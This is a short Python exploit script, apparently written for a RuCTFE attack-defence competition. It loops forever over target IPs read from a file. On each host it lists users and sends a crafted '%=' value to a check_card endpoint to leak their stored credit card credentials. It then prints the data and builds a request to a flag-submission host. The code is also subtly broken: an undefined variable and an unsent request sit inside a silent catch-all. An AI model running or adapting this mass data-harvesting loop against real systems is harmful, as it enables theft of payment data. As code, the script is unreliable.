#!/usr/bin/env python3


import json
import sys
import urllib
import urllib.request
import time

def get_user_listing(host):
    req = urllib.request.Request(host + "/list_users",
                                 headers={'content-type': 'application/json'})
    response = urllib.request.urlopen(req , timeout=0.5)
    return json.loads(response.read().decode('utf8'))["addition"]

def check_card(host, login, credit_card_credentials):
    new_conditions = {"addition": {"login": login, "credit_card_credentials": credit_card_credentials}}
    req = urllib.request.Request(host + "/check_card", data=json.dumps(new_conditions).encode('utf-8'),
                                 headers={'content-type': 'application/json'})
    response = urllib.request.urlopen(req)
    return json.loads(response.read().decode('utf8'))["addition"]

f = open("new_7.txt")
s=[]
for st in f.readlines():
    st =st.replace('\n','')
    s.append(st)
# if len(sys.argv) == 1:
#     host = 'http://10.60.94.2:3113'
# else:
#     host = 'http://' + sys.argv[1] + ':3113'
while True:
    for ss in s:
        host = 'http://' + ss + ':3113'
        try:
            users = get_user_listing(host)

            for user in users['users']:
                response = check_card(host, user, '%=')

                if 'credit_card_credentials' in response:
                    urllib.request.Request("http://monitor.ructfe.org/flags", data=json.dumps(new_conditions).encode('utf-8'),
                                           headers={'content-type': 'application/json'})
                    print(response['credit_card_credentials'], flush=True)
        except:
            pass